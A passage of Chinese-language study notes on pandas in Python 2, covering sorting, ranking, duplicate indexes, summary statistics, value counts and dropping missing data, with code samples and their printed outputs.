<li><p>排序</p>
<ol>
<li><p>sort~index~</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sort the series</span></span><br><span class="line">obj = pd.Series(range(<span class="number">4</span>), index = list(<span class="string">'dabc'</span>))</span><br><span class="line"><span class="keyword">print</span> obj.sort_index()</span><br><span class="line"><span class="comment">#sort the DF</span></span><br><span class="line">frame = pd.DataFrame(np.arange(<span class="number">8</span>).reshape(<span class="number">2</span>,<span class="number">4</span>),</span><br><span class="line">                     index = [<span class="string">'three'</span>, <span class="string">'one'</span>],</span><br><span class="line">                     columns = list(<span class="string">'dabc'</span>))</span><br><span class="line"><span class="comment">#sort the frame by the index unkonwn</span></span><br><span class="line"><span class="keyword">print</span> frame.sort_index()</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="comment">#sort hte frame by the columns unkonwn</span></span><br><span class="line"><span class="keyword">print</span> frame.sort_index(axis = <span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 降序</span></span><br><span class="line"><span class="keyword">print</span> frame.sort_index(axis = <span class="number">1</span>, ascending = <span class="literal">False</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="comment">#series排序，可以用 order方法</span></span><br><span class="line">obj = pd.Series([<span class="number">4</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">2</span>])</span><br><span class="line"><span class="keyword">print</span> obj.order()</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#NA值会排在最后面</span></span><br><span class="line">obj = pd.Series([<span class="number">4</span>, np.nan, <span class="number">7</span>, np.nan, <span class="number">-3</span> ,<span class="number">2</span>])</span><br><span class="line"><span class="keyword">print</span> obj.order()</span><br><span class="line"><span class="keyword">print</span></span><br></pre></td></tr></table></figure>
<ol>
<li><p>根据列或者多个列排序</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">frame = pd.DataFrame(&#123;<span class="string">'b'</span>: [<span class="number">4</span>,<span class="number">7</span>,<span class="number">-3</span>,<span class="number">2</span>], <span class="string">'a'</span>: [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>]&#125;)</span><br><span class="line"><span class="keyword">print</span> frame</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sort by column b'values</span></span><br><span class="line"><span class="keyword">print</span> frame.sort_index(by = <span class="string">'b'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sort by column a's values ,then sort by b's values</span></span><br><span class="line"><span class="keyword">print</span> frame.sort_index(by = [<span class="string">'a'</span>, <span class="string">'b'</span>])</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
</li>
<li><p>排名ranking <span class="tag" tag-name="没明白"><span class="smallcaps">没明白</span>&lt;/span&gt;</span></p>
<p>排名和排序关系密切，且他会增设一个排名值（从1开始，直到有效数据的数量）</p>
<ol>
<li><p>和numpy.argsort产生的简洁排序索引类似，不过可以根据规则破坏平级关系</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">obj = pd.Series([<span class="number">7</span>, <span class="number">-5</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>])</span><br><span class="line">obj1 = pd.Series(np.arange(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> obj.rank()</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> obj1.rank()</span><br></pre></td></tr></table></figure>
</li>
<li><p>根据出现顺序来给出排名（类似于稳定排序）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> obj.rank(method = <span class="string">'first'</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>降序</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> obj.rank(ascending = <span class="literal">False</span>, method = <span class="string">'max'</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>用于破坏平级关系的method选项</p>
<p>|    方法       |      说明                                    |<br>|—————-|—————————————————————|<br>| ‘average’ | 默认：在相等分组中，为各个值分配平均排名 |<br>| “min”     | 使用整个分组的最小排名                   |<br>| “max”     | 使用整个分组的最大排名                   |<br>| “first”   | 安值在原始数据的出现顺序分配排名         |</p>
</li>
</ol>
</li>
</ol>
</li>
<li><p>带有重复值的轴索引</p>
<ol>
<li><p>虽然很多pandas函数要求轴标签唯一，但是不是强制性的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">obj = pd.Series(range(<span class="number">5</span>), index = list(<span class="string">'aabbc'</span>))</span><br><span class="line"><span class="keyword">print</span> obj</span><br></pre></td></tr></table></figure>
</li>
<li><p>is~unique属性可以测试值是否唯一~</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> obj.index.is_unique</span><br></pre></td></tr></table></figure>
</li>
<li><p>对应多个值，会返回一个Serise,单个值则返回标准值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#有两个对应的值</span></span><br><span class="line"><span class="keyword">print</span> obj[<span class="string">'a'</span>]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="comment">#单个对应的值</span></span><br><span class="line"><span class="keyword">print</span> obj[<span class="string">'c'</span>]</span><br></pre></td></tr></table></figure>
<p>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4</span><br></pre></td></tr></table></figure>
</li>
<li><p>DF索引的情况也如此</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">df = pd.DataFrame(np.random.randn(<span class="number">4</span>,<span class="number">3</span>),index = list(<span class="string">'aabb'</span>))</span><br><span class="line"><span class="keyword">print</span> df</span><br><span class="line"><span class="keyword">print</span> df.ix[<span class="string">'b'</span>]</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>汇总和计算描述统计</p>
<ol>
<li><p>这组数学和统计方法基于没有缺失数据的假设而构建的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">df = pd.DataFrame([[<span class="number">1.4</span>, np.nan],[<span class="number">7.1</span>, <span class="number">-4.5</span>],</span><br><span class="line">                  [np.nan, np.nan], [<span class="number">0.75</span>, <span class="number">-1.3</span>]],</span><br><span class="line">                  index = list(<span class="string">'abcd'</span>),</span><br><span class="line">                  columns = [<span class="string">'one'</span>, <span class="string">"two"</span>])</span><br><span class="line"><span class="keyword">print</span> df</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    one  two</span><br><span class="line">a  1.40  NaN</span><br><span class="line">b  7.10 -4.5</span><br><span class="line">c   NaN  NaN</span><br><span class="line">d  0.75 -1.3</span><br></pre></td></tr></table></figure>
<ol>
<li><p>会自动跳过NA值，除非整个切片（行或列）都是NA，可通过skipna选项禁用这功能</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#跳过NA值，计算</span></span><br><span class="line"><span class="keyword">print</span> df.sum()</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#对行进行计算</span></span><br><span class="line"><span class="keyword">print</span> df.sum(axis = <span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#禁用skipna</span></span><br><span class="line"><span class="keyword">print</span> df.mean(axis = <span class="number">1</span>, skipna = <span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<ol>
<li><p>约简方法的选项</p>
<p>|   选项     |           说明                                          |<br>|————|——————————————————————————-|<br>| aixs   | 约简的轴。DataFrame的行用0，列用1                   |<br>| skipna | 排除缺失值，默认值为True                            |<br>| level  | 如果轴是层次化索引的(MultiIndex)，根据level分组约简 |</p>
</li>
</ol>
</li>
<li><p>有些是间接统计（如返回最大值或最小值索引）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#返回列中最大值的索引</span></span><br><span class="line"><span class="keyword">print</span> df.idxmax()</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#累计求和</span></span><br><span class="line"><span class="keyword">print</span> df.cumsum()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">one    b</span><br><span class="line">two    d</span><br><span class="line">dtype: object</span><br></pre></td></tr></table></figure>
<p>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    one  two</span><br><span class="line">a  1.40  NaN</span><br><span class="line">b  8.50 -4.5</span><br><span class="line">c   NaN  NaN</span><br><span class="line">d  9.25 -5.8</span><br></pre></td></tr></table></figure>
</li>
<li><p>既不是约简型也不是累计型</p>
<ol>
<li><p>describe 一次性产品多个汇总统计</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#数字型的汇总统计</span></span><br><span class="line"><span class="keyword">print</span> df</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> df.describe()</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#非数字的汇总统计</span></span><br><span class="line">obj = pd.Series(list(<span class="string">'aabc'</span>) * <span class="number">4</span>)</span><br><span class="line"><span class="keyword">print</span> obj.describe()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">    one  two</span><br><span class="line">a  1.40  NaN</span><br><span class="line">b  7.10 -4.5</span><br><span class="line">c   NaN  NaN</span><br><span class="line">d  0.75 -1.3</span><br><span class="line"></span><br><span class="line">            one       two</span><br><span class="line">count  3.000000  2.000000</span><br><span class="line">mean   3.083333 -2.900000</span><br><span class="line">std    3.493685  2.262742</span><br><span class="line">min    0.750000 -4.500000</span><br><span class="line">25%    1.075000 -3.700000</span><br><span class="line">50%    1.400000 -2.900000</span><br><span class="line">75%    4.250000 -2.100000</span><br><span class="line">max    7.100000 -1.300000</span><br><span class="line"></span><br><span class="line">count     16</span><br><span class="line">unique     3</span><br><span class="line">top        a</span><br><span class="line">freq       8</span><br><span class="line">dtype: object</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
</li>
<li><p>描述和汇总统计</p>
<p>|   方法            |             说明                           |<br>|———————-|————————————————————|<br>| count         | 非NA值的数量                           |<br>| describe      | 针对Series或各DF列计算汇总统计         |<br>| min max       | 计算最小值和最大值                     |<br>| argmin argmax | 计算能获得最小或最大的索引位置（整数） |<br>| idxmin idxmax | 计算能获得最小或最大的索引值           |<br>| quantile      | 计算样本的分位数（0到1）               |<br>| sum           | 值的总和                               |<br>| mean          | 值的平均值                             |<br>| median        | 值的算术中位数                         |<br>| mad           | 根据平均值计算平均绝对离差             |<br>| var           | 样本值的方差                           |<br>| std           | 样本值的标准差                         |<br>| skew          | 样本值的偏度（三阶矩）                 |<br>| kurt          | 样本值的峰度(四阶距）                  |<br>| cumsum        | 样本值的累计和                         |<br>| cummin cummax | 样本指的累计最大值和最小值             |<br>| cumprod       | 累计值的累计积                         |<br>| diff          | 计算一阶差分（队时间序列很有用0        |<br>| pct~change~   | 计算百分数变化                         |</p>
</li>
</ol>
</li>
<li><p>相关系数和协方差</p>
<ol>
<li><p>通过参数对计算</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas.io.data <span class="keyword">as</span> web</span><br><span class="line"><span class="comment">#获取来自Yahoo!Finance的股票价格和成交量</span></span><br><span class="line">all_data = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> ticker <span class="keyword">in</span> [<span class="string">'AAPL'</span>, <span class="string">'IBM'</span>, <span class="string">'MSFT'</span>]:</span><br><span class="line">    all_data[ticker] = web.get_data_yahoo(ticker,<span class="string">'1/1/2000'</span>,<span class="string">'1/1/2000'</span>)</span><br><span class="line">price = pd.DataFrame(&#123;tic: data[<span class="string">'Adj Close'</span>]</span><br><span class="line">                      <span class="keyword">for</span> tic, data <span class="keyword">in</span> all_data.iteritems()&#125;)</span><br><span class="line">volume = pd.DataFrame(&#123;tic : data[<span class="string">'Volume'</span>]</span><br><span class="line">                       <span class="keyword">for</span> tic, data <span class="keyword">in</span> all_data.iteritems()&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#计算价格的百分数变化</span></span><br><span class="line">returns = price.pct_change()</span><br><span class="line"><span class="keyword">print</span> returns.tail()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Empty DataFrame</span><br><span class="line">Columns: [AAPL, IBM, MSFT]</span><br><span class="line">Index: []</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>唯一值 值计算以及成员资格</p>
<ol>
<li><p>unique方法，返回obj的唯一值数组</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">obj = pd.Series(list(<span class="string">'cadaabbcc'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#得到唯一值</span></span><br><span class="line">uniques = obj.unique()</span><br><span class="line"><span class="keyword">print</span> uniques</span><br><span class="line"><span class="keyword">print</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&apos;c&apos; &apos;a&apos; &apos;d&apos; &apos;b&apos;]</span><br></pre></td></tr></table></figure>
<p>:</p>
</li>
<li><p>value~counts~ 计算一个Series中各值出现的频率</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#序列是降序排列的</span></span><br><span class="line"><span class="keyword">print</span> obj.value_counts()</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#除了方法还有pd的顶级方法</span></span><br><span class="line"><span class="keyword">print</span> pd.value_counts(obj.values, sort = <span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c    3</span><br><span class="line">a    3</span><br><span class="line">b    2</span><br><span class="line">d    1</span><br><span class="line">dtype: int64</span><br><span class="line"></span><br><span class="line">a    3</span><br><span class="line">c    3</span><br><span class="line">b    2</span><br><span class="line">d    1</span><br><span class="line">dtype: int64</span><br></pre></td></tr></table></figure>
</li>
<li><p>isin 判断矢量化集合的成员资格</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mask = obj.isin([<span class="string">'b'</span>, <span class="string">'c'</span>])</span><br><span class="line"><span class="keyword">print</span> mask</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> obj[mask]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0     True</span><br><span class="line">1    False</span><br><span class="line">2    False</span><br><span class="line">3    False</span><br><span class="line">4    False</span><br><span class="line">5     True</span><br><span class="line">6     True</span><br><span class="line">7     True</span><br><span class="line">8     True</span><br><span class="line">dtype: bool</span><br><span class="line"></span><br><span class="line">0    c</span><br><span class="line">5    b</span><br><span class="line">6    b</span><br><span class="line">7    c</span><br><span class="line">8    c</span><br><span class="line">dtype: object</span><br></pre></td></tr></table></figure>
</li>
<li><p>唯一值 值计算 成员资格方法</p>
<p>|   方法            |    说明                                                          |<br>|———————-|———————————————————————————————|<br>| isin          | 计算一个表示“Series各值是否包含于传入的值序列中”的布尔型数组 |<br>| unique        | 计算Series中的唯一值数组，安发现的顺序返回                   |<br>| value~counts~ | 返回一个Series,其索引为唯一值，其值为频率，降序排序          |</p>
</li>
<li><p>得到DF多个相关列柱状图</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">data = pd.DataFrame(&#123;<span class="string">'Qu1'</span>: [<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">4</span>],</span><br><span class="line">                     <span class="string">'Qu2'</span>: [<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line">                     <span class="string">"QU3"</span>: [<span class="number">1</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">4</span>]&#125;)</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="comment">#将pandas.value_counts传给DF的apply函数得到各列的元素个数</span></span><br><span class="line"><span class="comment">#NA值填充为0</span></span><br><span class="line">result = data.apply(pd.value_counts).fillna(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">print</span> result</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   QU3  Qu1  Qu2</span><br><span class="line">0    1    1    2</span><br><span class="line">1    5    3    3</span><br><span class="line">2    2    4    1</span><br><span class="line">3    4    3    2</span><br><span class="line">4    4    4    3</span><br><span class="line"></span><br><span class="line">   QU3  Qu1  Qu2</span><br><span class="line">1  1.0  1.0  1.0</span><br><span class="line">2  1.0  0.0  2.0</span><br><span class="line">3  0.0  2.0  2.0</span><br><span class="line">4  2.0  2.0  0.0</span><br><span class="line">5  1.0  0.0  0.0</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>处理缺失数据</p>
<ol>
<li><p>NA处理方法</p>
<p>|  方法       |    说明                                            |<br>|————-|————————————————————————|<br>| dropna  | 根据各标签的值是否存在缺失数据对轴标签进行过滤 |<br>|         | 可通过闸值调节对缺失值的容忍度                 |<br>| fillna  | 用指定值或插值方法(如ffill或bfill)填充缺失数据 |<br>| isnull  | 返回一个含有布尔值的对象                       |<br>| notnull | 和isnull相反                                   |</p>
</li>
</ol>
</li>
<li><p>滤除缺失数据</p>
<ol>
<li><p>Series中的处理方法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#   dropna方法,不改变obj</span></span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> nan <span class="keyword">as</span> NA</span><br><span class="line">data = pd.Series([<span class="number">1</span>, NA, <span class="number">3.5</span>, NA, <span class="number">7</span>])</span><br><span class="line"><span class="keyword">print</span> data.dropna()</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="comment">#    用notnull方法</span></span><br><span class="line"><span class="keyword">print</span> data[data.notnull()]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0    1.0</span><br><span class="line">2    3.5</span><br><span class="line">4    7.0</span><br><span class="line">dtype: float64</span><br><span class="line">0    1.0</span><br><span class="line">2    3.5</span><br><span class="line">4    7.0</span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure>
</li>
<li><p>DF中的处理方法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data = pd.DataFrame([[<span class="number">1</span>,<span class="number">6.5</span>,<span class="number">3</span>], [<span class="number">1</span>,NA, NA],</span><br><span class="line">                     [NA,NA,NA], [NA, <span class="number">6.5</span>, <span class="number">3</span>]])</span><br><span class="line">cleaned = data.dropna()</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> cleaned</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     0    1    2</span><br><span class="line">0  1.0  6.5  3.0</span><br><span class="line">1  1.0  NaN  NaN</span><br><span class="line">2  NaN  NaN  NaN</span><br><span class="line">3  NaN  6.5  3.0</span><br></pre></td></tr></table></figure>
<p>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">     0    1    2</span><br><span class="line">0  1.0  6.5  3.0</span><br></pre></td></tr></table></figure>
<ol>
<li><p>丢弃全部为NA的行和列</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#   丢弃全部NA的那些行</span></span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> data.dropna(how = <span class="string">'all'</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  丢弃全部NA的那些列</span></span><br><span class="line">data[<span class="number">4</span>] = NA</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> data.dropna(axis = <span class="number">1</span>, how = <span class="string">'all'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">     0    1    2</span><br><span class="line">0  1.0  6.5  3.0</span><br><span class="line">1  1.0  NaN  NaN</span><br><span class="line">2  NaN  NaN  NaN</span><br><span class="line">3  NaN  6.5  3.0</span><br><span class="line"></span><br><span class="line">     0    1    2</span><br><span class="line">0  1.0  6.5  3.0</span><br><span class="line">1  1.0  NaN  NaN</span><br><span class="line">3  NaN  6.5  3.0</span><br><span class="line"></span><br><span class="line">     0    1    2   4</span><br><span class="line">0  1.0  6.5  3.0 NaN</span><br><span class="line">1  1.0  NaN  NaN NaN</span><br><span class="line">2  NaN  NaN  NaN NaN</span><br><span class="line">3  NaN  6.5  3.0 NaN</span><br><span class="line"></span><br><span class="line">     0    1    2</span><br><span class="line">0  1.0  6.5  3.0</span><br><span class="line">1  1.0  NaN  NaN</span><br><span class="line">2  NaN  NaN  NaN</span><br><span class="line">3  NaN  6.5  3.0</span><br></pre></td></tr></table></figure>
</li>
<li><p>丢弃</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">df = pd.DataFrame(np.random.randn(<span class="number">7</span>,<span class="number">3</span>))</span><br><span class="line">df.ix[:<span class="number">4</span>,<span class="number">1</span>] = NA</span><br><span class="line">df.ix[:<span class="number">2</span>, <span class="number">2</span>] = NA</span><br><span class="line"><span class="keyword">print</span> df</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> df.dropna()</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#thresh参数为一行拥有[参数]个非NA值</span></span><br><span class="line"><span class="keyword">print</span> df.dropna(thresh = <span class="number">3</span>)</span><br></pre></td></tr></table></figure>
